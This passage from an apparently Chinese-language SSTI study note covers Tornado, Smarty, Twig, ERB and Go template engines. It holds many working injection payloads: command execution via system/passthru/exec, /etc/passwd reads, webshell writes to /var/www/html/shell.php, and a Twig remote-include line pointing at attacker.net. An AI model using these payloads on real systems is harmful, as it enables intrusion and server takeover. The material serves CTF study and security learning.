post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre>
<h4 id="打马环节待补完"><a class="markdownIt-Anchor" href="#打马环节待补完"></a> 打马环节(待补完)</h4>
<h3 id="tornado"><a class="markdownIt-Anchor" href="#tornado"></a> Tornado</h3>
<pre><code class="highlight plaintext">神必龙卷风</code></pre>
<h4 id="基础了解"><a class="markdownIt-Anchor" href="#基础了解"></a> 基础了解</h4>
<p><code>Tornado</code>是一个具有异步功能的简单web框架</p>
<pre><code class="highlight python"><span class="keyword">import</span> tornado.ioloop
<span class="keyword">import</span> tornado.web

<span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):
    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):
        <span class="variable language_">self</span>.write(<span class="string">&quot;Hello, world&quot;</span>)

<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    application = tornado.web.Application([
        (<span class="string">r&quot;/&quot;</span>, MainHandler),
    ])
    application.listen(<span class="number">8888</span>)
    tornado.ioloop.IOLoop.current().start()</code></pre>
<p>它使用<code>RequestHandler</code>来处理发送过来的web请求</p>
<h4 id="特性"><a class="markdownIt-Anchor" href="#特性"></a> 特性</h4>
<p>这里大部分的payload是万卷不离其宗的(指继承链)</p>
<p>如果要谈特性</p>
<p>大概是<code>application</code></p>
<p>因为<code>Tornado</code>模板一般需要引入<code>Tornado.web</code></p>
<p>而在<code>Tornado.web.application</code>下就可以发现框架的<code>settings</code></p>
<h2 id="php模板注入"><a class="markdownIt-Anchor" href="#php模板注入"></a> PHP模板注入</h2>
<p>php常见的模板：twig，smarty，blade</p>
<h3 id="smarty"><a class="markdownIt-Anchor" href="#smarty"></a> Smarty</h3>
<p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
<p>基本确定指令</p>
<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre>
<p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p>
<ul>
<li>
<p>基于XFF的普通注入:在{}内疯狂输出</p>
</li>
<li>
<p>利用{include}来任意文件读取；string:{include file=‘D:\flag.txt’}这时文本内容就被读取了</p>
</li>
</ul>
<h4 id="通过self获取smarty类再调用其静态方法"><a class="markdownIt-Anchor" href="#通过self获取smarty类再调用其静态方法"></a> <strong>通过self获取Smarty类再调用其静态方法</strong></h4>
<p><strong>getStreamVariable:</strong></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span>
<span class="function"></span>&#123;
        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>
        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
            &#125;
            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
            <span class="keyword">return</span> <span class="variable">$_result</span>;
        &#125;
        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">return</span> <span class="literal">null</span>;
        &#125;
    &#125;
<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>
smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流
例如：
&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>
<p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> <a href="//xn--v3-rl8c.1.xn--30-5c5cs2dfpla4583fihxa">//在v3.1.30退出历史舞台</a></p>
<p><strong>writeFile：</strong></p>
<p>这个不是很懂，直接引用这个大佬的博客吧</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
        &#125;

        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
        <span class="comment">// if subdirs, create dir structure</span>
        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
        &#125;

        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>
<p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p>
<p>我们注意看这段代码</p>
<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>
<p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p>
<p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p>
<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>
<p>就有了</p>
<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>
<p>我们将<code>&lt;?php passthru($_GET['cmd']); ?&gt;</code>写入了临时php文件中</p>
<p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p>
<p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p>
<p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p>
<h4 id="标签"><a class="markdownIt-Anchor" href="#标签"></a> 标签:</h4>
<p><strong>{$smarty.version}</strong></p>
<p>获取smarty的版本信息</p>
<p><strong>{literal}</strong></p>
<p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p>
<p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p>
<p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p>
<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>
<p><strong>{php}{/php}</strong></p>
<p>用于执行php代码</p>
<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>
<p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p>
<p><strong>{if}{/if}</strong></p>
<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
<span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span>
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</code></pre>
<h3 id="twig"><a class="markdownIt-Anchor" href="#twig"></a> twig</h3>
<h4 id="语法结构-2"><a class="markdownIt-Anchor" href="#语法结构-2"></a> 语法结构</h4>
<p>有两种形式的分隔符：<code>&#123;% ... %&#125;</code> 和 <code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中。</p>
<p>应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 <code>.</code> 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），也可以使用所谓的 “subscript” 语法 <code>[]</code>:</p>
<pre><code class="highlight plaintext">&#123;&#123; foo.bar &#125;&#125;
&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</code></pre>
<p><strong>设置变量</strong></p>
<p>为模块代码内变量赋值时使用<code>set</code>标签</p>
<pre><code class="highlight plaintext">&#123;% set foo = &#x27;foo&#x27; %&#125;
&#123;% set foo = [1, 2] %&#125;
&#123;% set foo = &#123;&#x27;foo&#x27;: &#x27;bar&#x27;&#125; %&#125;</code></pre>
<p><strong>过滤器</strong></p>
<p>twig还提供了过滤器来修改模板中的变量。在过滤器中，变量与一个或多个过滤器间使用|分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。</p>
<p>下面这个过滤器的例子会剥去字符串变量 <code>name</code> 中的 HTML 标签，然后将其转化为大写字母开头的格式:</p>
<pre><code class="highlight plaintext">&#123;&#123; name|striptags|title &#125;&#125;

// &#123;&#123; &#x27;&lt;a&gt;whoami&lt;a&gt;&#x27;|striptags|title &#125;&#125;
// Output: Whoami!</code></pre>
<p>下面这个过滤器将接收一个序列 <code>list</code>，然后使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串：</p>
<pre><code class="highlight plaintext">&#123;&#123; list|join &#125;&#125;
&#123;&#123; list|join(&#x27;, &#x27;) &#125;&#125;

// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join &#125;&#125;
// Output: abc

// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join(&#x27;|&#x27;) &#125;&#125;
// Output: a|b|c</code></pre>
<p><strong>函数</strong></p>
<p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 <code>range()</code> 函数用来返回一个包含整数等差数列的列表：</p>
<pre><code class="highlight plaintext">&#123;% for i in range(0, 3) %&#125;
    &#123;&#123; i &#125;&#125;,
&#123;% endfor %&#125;

// Output: 0, 1, 2, 3,</code></pre>
<p><strong>引入其他模板</strong></p>
<p>Twig 提供的 <code>include</code> 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：</p>
<pre><code class="highlight plaintext">&#123;&#123; include(&#x27;sidebar.html&#x27;) &#125;&#125;</code></pre>
<h4 id="注入"><a class="markdownIt-Anchor" href="#注入"></a> 注入</h4>
<h5 id="twig-1x"><a class="markdownIt-Anchor" href="#twig-1x"></a> Twig 1.x</h5>
<p>在 Twig 1.x 中存在三个全局变量：</p>
<ul>
<li><code>_self</code>：引用当前模板的实例。</li>
<li><code>_context</code>：引用当前上下文。</li>
<li><code>_charset</code>：引用当前字符集。</li>
</ul>
<p>对应的代码是：</p>
<pre><code class="highlight plaintext">protected $specialVars = [
        &#x27;_self&#x27; =&gt; &#x27;$this&#x27;,
        &#x27;_context&#x27; =&gt; &#x27;$context&#x27;,
        &#x27;_charset&#x27; =&gt; &#x27;$this-&gt;env-&gt;getCharset()&#x27;,
    ];</code></pre>
<p>这里主要就是利用 <code>_self</code> 变量，它会返回当前 <code>\Twig\Template</code> 实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行 SSTI。</p>
<p>比如以下 Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p>
<pre><code class="highlight plaintext">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</code></pre>
<p>此外还有 <code>getFilter</code> 方法：</p>
<pre><code class="highlight plaintext">public function getFilter($name)
  &#123;
    ...
    foreach ($this-&gt;filterCallbacks as $callback) &#123;
    if (false !== $filter = call_user_func($callback, $name)) &#123;
      return $filter;
    &#125;
  &#125;
  return false;
&#125;

public function registerUndefinedFilterCallback($callable)
&#123;
  $this-&gt;filterCallbacks[] = $callable;
&#125;</code></pre>
<p>我们在 <code>getFilter</code> 里发现了危险函数 <code>call_user_func</code>。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
<pre><code class="highlight plaintext">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
<p>但是在 Twig 2.x 及 Twig 3.x 以后，<code>_self</code> 的作用发生了变化，只能返回当前实例名字符串：</p>
<h5 id="twig-2x-3x"><a class="markdownIt-Anchor" href="#twig-2x-3x"></a> Twig 2.x / 3.x</h5>
<p>到了 Twig 2.x / 3.x 版本中，<code>__self</code> 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。</p>
<p><strong>map</strong></p>
<p>进行一个映射关系</p>
<pre><code class="highlight plaintext">map 过滤器将箭头函数应用于序列或映射的元素。箭头函数接收序列或映射的值

&#123;% set people = [
    &#123;first: &quot;Bob&quot;, last: &quot;Smith&quot;&#125;,
    &#123;first: &quot;Alice&quot;, last: &quot;Dupond&quot;&#125;,
] %&#125;

&#123;&#123; people|map(p =&gt; &quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
&#123;# outputs Bob Smith, Alice Dupond #&#125;
箭头函数还将键作为第二个参数接收

&#123;% set people = &#123;
    &quot;Bob&quot;: &quot;Smith&quot;,
    &quot;Alice&quot;: &quot;Dupond&quot;,
&#125; %&#125;

&#123;&#123; people|map((value, key) =&gt; &quot;#&#123;key&#125; #&#123;value&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
&#123;# outputs Bob Smith, Alice Dupond #&#125;
请注意，箭头函数可以访问当前上下文。</code></pre>
<p>也就是说当我们使用<code>map</code>时</p>
<p><code>&#123;&#123;["Mark"]|map((arg)=>"Hello #&#123;arg&#125;!")&#125;&#125;</code>会被编译成<code>twig_array_map([0 =&gt; &quot;Mark&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__; return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))&#125;)</code></p>
<p>这个 <code>twig_array_map</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_array_map($array, $arrow)
&#123;
    $r = [];
    foreach ($array as $k =&gt; $v) &#123;
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    &#125;

    return $r;
&#125;</code></pre>
<p>从上面的代码我们可以看到，传入的 <code>$arrow</code> 直接就被当成函数执行，即 <code>$arrow($v, $k)</code>，而 <code>$v</code> 和 <code>$k</code> 分别是 <code>$array</code> 中的 value 和 key。<code>$array</code> 和 <code>$arrow</code> 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
<p>如果函数被禁止了也可以通过写马来进行RCE</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;phpinfo();&quot;]|map(&quot;assert&quot;)|join(&quot;,&quot;)&#125;&#125;
&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;    // 写 Webshell</code></pre>
<p><strong>sort</strong></p>
<p>这个 <code>sort</code> 筛选器可以用来对数组排序。</p>
<pre><code class="highlight plaintext">&#123;% for user in users|sort %&#125;
    ...
&#123;% endfor %&#125;</code></pre>
<p>可以传递一个箭头函数来配置排序</p>
<pre><code class="highlight plaintext">&#123;% set fruits = [
    &#123;name: &#x27;Apples&#x27;, quantity: 5&#125;,
    &#123;name: &#x27;Oranges&#x27;, quantity: 2&#125;,
    &#123;name: &#x27;Grapes&#x27;, quantity: 4&#125;,
] %&#125;

&#123;% for fruit in fruits|sort((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|column(&#x27;name&#x27;) %&#125;
    &#123;&#123; fruit &#125;&#125;
&#123;% endfor %&#125;

&#123;# output in this order: Oranges, Grapes, Apples #&#125;</code></pre>
<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_sort_filter</code> 函数，这个 <code>twig_sort_filter</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_sort_filter($array, $arrow = null)
&#123;
    if ($array instanceof \Traversable) &#123;
        $array = iterator_to_array($array);
    &#125; elseif (!\is_array($array)) &#123;
        throw new RuntimeError(sprintf(&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;, \gettype($array)));
    &#125;

    if (null !== $arrow) &#123;
        uasort($array, $arrow);    // 直接被 uasort 调用 
    &#125; else &#123;
        asort($array);
    &#125;

    return $array;
&#125;</code></pre>
<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>uasort</code> 函数调用。众所周知 <code>uasort</code> 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;,0];
php &gt; usort($arr,&quot;system&quot;);
uid=0(root) gid=0(root) groups=0(root)
php &gt;</code></pre>
<p>知道了做这些我们便可以构造 Payload 了：</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
<p><strong>filter</strong></p>
<p>这个 <code>filter</code> 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：</p>
<pre><code class="highlight plaintext">&#123;% set lists = [34, 36, 38, 40, 42] %&#125;
&#123;&#123; lists|filter(v =&gt; v &gt; 38)|join(&#x27;, &#x27;) &#125;&#125;

// Output: 40, 42</code></pre>
<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_filter</code> 函数，这个 <code>twig_array_filter</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_array_filter($array, $arrow)
&#123;
    if (\is_array($array)) &#123;
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    &#125;

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
&#125;</code></pre>
<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_filter</code> 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;];
php &gt; array_filter($arr,&quot;system&quot;);
uid=0(root) gid=0(root) groups=0(root)
php &gt;</code></pre>
<pre><code class="highlight plaintext">poc:
&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|filter(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|filter(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
<p><strong>reduce</strong></p>
<p>这个 <code>reduce</code> 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：</p>
<pre><code class="highlight plaintext">&#123;% set numbers = [1, 2, 3] %&#125;
&#123;&#123; numbers|reduce((carry, v) =&gt; carry + v) &#125;&#125;
// Output: 6</code></pre>
<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_reduce</code> 函数，这个 <code>twig_array_reduce</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_array_reduce($array, $arrow, $initial = null)
&#123;
    if (!\is_array($array)) &#123;
        $array = iterator_to_array($array);
    &#125;

    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
&#125;</code></pre>
<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_reduce</code> 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。</p>
<p>直接给出 Payload：</p>
<pre><code class="highlight plaintext">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;id&quot;)&#125;&#125;
&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;id&quot;)&#125;&#125;
&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;id&quot;)&#125;&#125;    // 无回显</code></pre>
<h2 id="erb模板注入"><a class="markdownIt-Anchor" href="#erb模板注入"></a> ERB模板注入</h2>
<p>Ruby的SSTI</p>
<pre><code class="highlight ruby">&lt;% 写逻辑脚本(<span class="title class_">Ruby</span>语法) %&gt;
&lt;%= 直接输出变量值或运算结果 %&gt;</code></pre>
<p>遇到的很少，简单的写一下</p>
<pre><code class="highlight plaintext">&lt;%= File.read(&quot;/etc/passwd&quot;)%&gt;</code></pre>
<p>验证是否存在ERB模板注入，也可以利用<code>&lt;%= self.name %&gt;</code>测试如果弹出相关内容说明存在ERB模板注入</p>
<p>而且大概率可以转到RCE了</p>
<pre><code class="highlight plaintext">&lt;%= IO.popen(&#x27;id&#x27;).readlines()%&gt;</code></pre>
<p>或者是源码中存在的一些函数进行操作</p>
<p>当然由于其是面向对象的，也可以采用类似继承链的方式来找上下文</p>
<pre><code class="highlight ruby"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span>

template = <span class="string">&quot;text to be generated: &lt;%= x %&gt;&quot;</span>
erb_object = <span class="variable constant_">ERB</span>.new(template)
x = <span class="variable language_">self</span>.<span class="keyword">class</span>.name
puts erb_object.result(binding())
<span class="comment">=begin</span>
<span class="comment">输出text to be generated: Object</span>
<span class="comment">=end</span></code></pre>
<h2 id="golang模板注入"><a class="markdownIt-Anchor" href="#golang模板注入"></a> Golang模板注入</h2>
<p>Go语言本身提供了两种引擎</p>
<pre><code class="highlight plaintext">html/template和text/template</code></pre>
<p>其中text/template是不会主动转义用户输入的</p>
<p>首先要了解一下Go模板的语法</p>
<p>在Go中，<code>&#123;&#123;&#125;&#125;</code>被称为pipeline，我们可以将其视为函数或者某个函数值，<code>&#123;&#123;.&#125;&#125;</code>是表示当前作用域的对象</p>
<p>对于Go的模板来说，每个操作都是基于源码上下文本身的。也就是说，你无法在Go的模板注入中做出类似于Python的SSTI中的操作:直接去调用<code>os subprocess</code>这些系统库</p>
<p>但是相似的，作为模板他们都具备<code>if </code>这个功能，但是go在这方面更为健全</p>
<pre><code class="highlight plaintext">html/template提供了and函数
&#123;&#123;if and A B&#125;&#125;如果全真默认返回最后一个，一旦遇到假的就会返回假值
or函数和其相似
&#123;&#123;if and A B&#125;&#125;如果全假默认返回最后一个，一旦遇到真的就会返回真值
eq：判断相等 (eq a b)

ne：判断不等 (ne a b)

lt：小于 (lt a b)

le：小于等于 (le a b)

gt：大于 (gt a b)

ge：大于等于 (ge a b)</code></pre>
<p>除此之外，在Go模板中还有一些内置的函数来帮助执行</p>
<pre><code class="highlight plaintext">call 调用函数值 //call .Func &quot;args&quot;
index 按索引/key来取得一个元素 index x i ==x[i] 如果要取当前作用域的元素则使用 index . [key]
slice 截取切片/数组的长度
len 返回长度</code></pre>
<p>在模板中可以用调用<code>template.New('xxx').Funcs(template,FuncMap)</code>来创建自定义函数</p>
<p><code>|</code>可以和<code>&#123;&#123;&#125;&#125;</code>进行搭配，例如<code>&#123;&#123;.&#125;&#125; | printf &quot;%s\n&quot; &quot;abcd&quot;</code></p>
<p>也可以在里面<code>&#123;&#123;A|B&#125;&#125;</code>，此时左边的输出作为右边的输入</p>
<p><code>&#123;&#123;.&#125;&#125;</code>的结果将会被传递到printf，且传递参数的位置是abcd之后</p>
<h3 id="基本应用"><a class="markdownIt-Anchor" href="#基本应用"></a> 基本应用</h3>
<p>可以用这个来测试是否存在</p>
<pre><code class="highlight plaintext">&#123;&#123;println 0B101101011011011110001010110&#125;&#125;//存在则输出95272022</code></pre>
<p>像flask的ssti一样，要会打<code>&#123;&#123;&#125;&#125;</code>，但是要用if这些语句来辅助的时候不能不知道怎么做</p>
<pre><code class="highlight plaintext">条件判断
&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;
&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125;
&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else if pipeline&#125;&#125; T0 &#123;&#123;end&#125;&#125;
